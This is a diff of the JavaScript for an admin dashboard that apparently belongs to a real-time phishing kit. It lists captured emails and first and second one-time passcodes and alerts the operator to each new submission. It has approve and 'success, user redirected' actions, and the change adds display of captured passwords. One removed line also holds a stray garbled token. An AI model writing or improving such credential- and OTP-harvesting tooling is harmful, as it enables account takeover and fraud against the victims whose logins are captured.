@@ -599,27 +599,22 @@ otpSound.preload = 'auto';
 signupSound.volume = 0.8;
 otpSound.volume = 0.8;
 
-// Initialize audio automatically on page load
 function initAudio() {
     if (audioContextInitialized) return;
-    
     try {
         const AudioCtx = window.AudioContext || window.webkitAudioContext;
         const audioContext = new AudioCtx();
         const gainNode = audioContext.createGain();
         const silentBuffer = audioContext.createBuffer(1, 1, 22050);
         const source = audioContext.createBufferSource();
-        
         gainNode.gain.value = 0;
         gainNode.connect(audioContext.destination);
         source.buffer = silentBuffer;
         source.connect(gainNode);
         source.start(0);
-        
         audioContext.resume().then(() => {
             audioContextInitialized = true;
             isAudioReady = true;
-            console.log('✅ Audio ready');
         }).catch(e => console.log('Audio error:', e));
     } catch(e) {
         const silentAudio = new Audio();
@@ -634,13 +629,11 @@ function initAudio() {
 
 function playSound(type) {
     if (!soundEnabled) return;
-    
     if (!isAudioReady) {
         initAudio();
         setTimeout(() => playSound(type), 200);
         return;
     }
-    
     const sound = type === 'signup' ? signupSound : otpSound;
     sound.currentTime = 0;
     sound.play().catch(e => console.log('Play error:', e));
@@ -673,13 +666,11 @@ function showToast(title, message) {
     document.getElementById('toastMessage').textContent = message;
     toast.style.display = 'block';
     setTimeout(() => toast.style.display = 'none', 4000);
-    
     if (Notification.permission === 'granted') { 
         new Notification(title, { body: message }); 
     }
 }
 
-// Request notification permission
 if (Notification.permission === 'default') {
     Notification.requestPermission();
 }
@@ -705,7 +696,6 @@ function formatDate(dateString) {
     return `${year}-${month}-${day} ${hours}:${minutes}`; 
 }
 
-// ==================== HTML ESCAPE ====================
 function escapeHtml(str) { 
     if (!str) return ''; 
     return str.replace(/[&<>]/g, function(m) { 
@@ -740,6 +730,7 @@ function openModal(user) {
     const modalContent = document.getElementById('modalContent');
     modalContent.innerHTML = `
         <div class="modal-field"><div class="modal-label">Email</div><div class="value-row"><div class="modal-value">${escapeHtml(user.email)}</div><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')"><ion-icon name="copy-outline"></ion-icon></button></div></div>
+        <div class="modal-field"><div class="modal-label">Password</div><div class="value-row"><div class="modal-value">${user.password || 'user'}</div><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.password || 'user')}')"><ion-icon name="copy-outline"></ion-icon></button></div></div>
         <div class="modal-field"><div class="modal-label">First OTP</div><div class="value-row"><div class="modal-value">${user.otp || 'Not submitted'}</div>${user.otp ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp)}')"><ion-icon name="copy-outline"></ion-icon></button>` : ''}</div></div>
         <div class="modal-field"><div class="modal-label">Second OTP</div><div class="value-row"><div class="modal-value">${user.second_otp || 'Not submitted'}</div>${user.second_otp ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.second_otp)}')"><ion-icon name="copy-outline"></ion-icon></button>` : ''}</div></div>
         <div class="modal-field"><div class="modal-label">Status</div><div class="modal-value" style="color: ${getStatusColor(user)}">${getStatusText(user)}</div></div>
@@ -758,7 +749,6 @@ let isFirstLoad = true;
 
 function checkForNewEvents(users) {
     if (isFirstLoad) {
-        // Store initial state without alerts
         users.forEach(user => {
             previousUserMap.set(user.email, {
                 approved: user.approved,
@@ -777,35 +767,21 @@ function checkForNewEvents(users) {
         const previous = previousUserMap.get(user.email);
         
         if (!previous) {
-            // NEW USER SIGNUP - Play sound and show alert (INCOMING EVENT)
             if (!user.otp1_never) {
                 playSound('signup');
                 showToast('New Signup', `${user.email} signed up`);
-                const card = document.getElementById('pendingEmailCard');
-                card.classList.add('has-new');
-                setTimeout(() => card.classList.remove('has-new'), 3000);
             }
         } else {
-            // Check for NEW FIRST OTP submission (INCOMING EVENT)
             if (!previous.otp && user.otp && !user.otp1_never && !user.otp1_correct) {
                 playSound('otp');
                 showToast('First OTP', `${user.email} submitted OTP: ${user.otp}`);
-                const card = document.getElementById('pendingFirstCard');
-                card.classList.add('has-new');
-                setTimeout(() => card.classList.remove('has-new'), 3000);
             }
-            
-            // Check for NEW SECOND OTP submission (INCOMING EVENT)
             if (!previous.second_otp && user.second_otp && !user.otp1_never && !user.otp2_correct) {
                 playSound('otp');
                 showToast('Second OTP', `${user.email} submitted second OTP`);
-                const card = document.getElementById('pendingSecondCard');
-                card.classList.add('has-new');
-                setTimeout(() => card.classList.remove('has-new'), 3000);
             }
         }
         
-        // Update previous state
         previousUserMap.set(user.email, {
             approved: user.approved,
             otp: user.otp,
@@ -815,14 +791,6 @@ function checkForNewEvents(users) {
             otp2_correct: user.otp2_correct
         });
     });
-    
-    // Clean up deleted users
-    for (let [email, prev] of previousUserMap.entries()) {
-        const stillExists = users.find(u => u.email === email);
-        if (!stillExists && !isFirstLoad) {
-            previousUserMap.delete(email);
-        }
-    }
 }
 
 // ==================== FETCH USERS ====================
@@ -835,7 +803,6 @@ async function fetchUsers() {
             return; 
         }
         const users = await response.json();
-        
         checkForNewEvents(users);
         displayUsers(users);
         updateStats(users);
@@ -844,7 +811,6 @@ async function fetchUsers() {
     }
 }
 
-// ==================== UPDATE STATS ====================
 function updateStats(users) {
     const total = users.length;
     const pendingEmail = users.filter(u => !u.approved && !u.otp1_never).length;
@@ -861,7 +827,6 @@ function updateStats(users) {
     document.getElementById('neverCount').textContent = never;
 }
 
-// ==================== DISPLAY USERS ====================
 function displayUsers(users) {
     const tbody = document.getElementById('usersTableBody');
     if (!users.length) { 
@@ -911,18 +876,18 @@ function displayUsers(users) {
         
         actionButtons += `<button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon>Delete</button></div>`;
         
-        return `｜｜DSML｜｜
-            <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;"><strong>${escapeHtml(user.email)}</strong></td>
-            <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.otp ? `<span class="otp-code" onclick="event.stopPropagation();">${user.otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
-            <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.second_otp ? `<span class="otp-code" onclick="event.stopPropagation();">${user.second_otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.second_otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
-            <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${statusBadge}</td>
-            <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${formatDate(user.created_at)}</td>
+        return `<tr>
+            <td onclick="openModal({email:'${escapeHtml(user.email)}', password:'${escapeHtml(user.password || 'user')}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;"><strong>${escapeHtml(user.email)}</strong></td>
+            <td onclick="openModal({email:'${escapeHtml(user.email)}', password:'${escapeHtml(user.password || 'user')}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.otp ? `<span class="otp-code" onclick="event.stopPropagation();">${user.otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
+            <td onclick="openModal({email:'${escapeHtml(user.email)}', password:'${escapeHtml(user.password || 'user')}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.second_otp ? `<span class="otp-code" onclick="event.stopPropagation();">${user.second_otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.second_otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
+            <td onclick="openModal({email:'${escapeHtml(user.email)}', password:'${escapeHtml(user.password || 'user')}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${statusBadge}</td>
+            <td onclick="openModal({email:'${escapeHtml(user.email)}', password:'${escapeHtml(user.password || 'user')}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${formatDate(user.created_at)}</td>
             <td>${actionButtons}</td>
         </tr>`;
     }).join('');
 }
 
-// ==================== API CALLS FOR ADMIN ACTIONS (NO SOUNDS) ====================
+// ==================== API CALLS - NO SOUNDS FOR ADMIN ACTIONS ====================
 async function apiCall(endpoint, method, email, successMsg, errorMsg) {
     try {
         const response = await fetch(endpoint, { 
@@ -934,7 +899,6 @@ async function apiCall(endpoint, method, email, successMsg, errorMsg) {
         if (data.success) { 
             showToast('Success', successMsg); 
             fetchUsers(); 
-            // ❌ NO playSound() here - admin actions should NOT trigger sounds
         } else { 
             showToast('Error', data.detail || errorMsg); 
         }
@@ -943,7 +907,6 @@ async function apiCall(endpoint, method, email, successMsg, errorMsg) {
     }
 }
 
-// Admin action functions - NO SOUNDS
 function approveEmail(email) { apiCall('/api/admin/approve-user', 'POST', email, 'Email approved', 'Failed'); }
 function approveFirstOTP(email) { apiCall('/api/admin/approve-first-otp', 'POST', email, 'First OTP approved', 'Failed'); }
 function successFirstOTP(email) { apiCall('/api/admin/success-first-otp', 'POST', email, 'Success! User redirected', 'Failed'); }
@@ -970,7 +933,6 @@ setupTheme();
 fetchUsers();
 setInterval(fetchUsers, 3000);
 
-// Button event listeners
 document.getElementById('soundToggleBtn').onclick = toggleSound;
 document.getElementById('logoutBtn').onclick = () => { 
     localStorage.removeItem('adminToken'); 
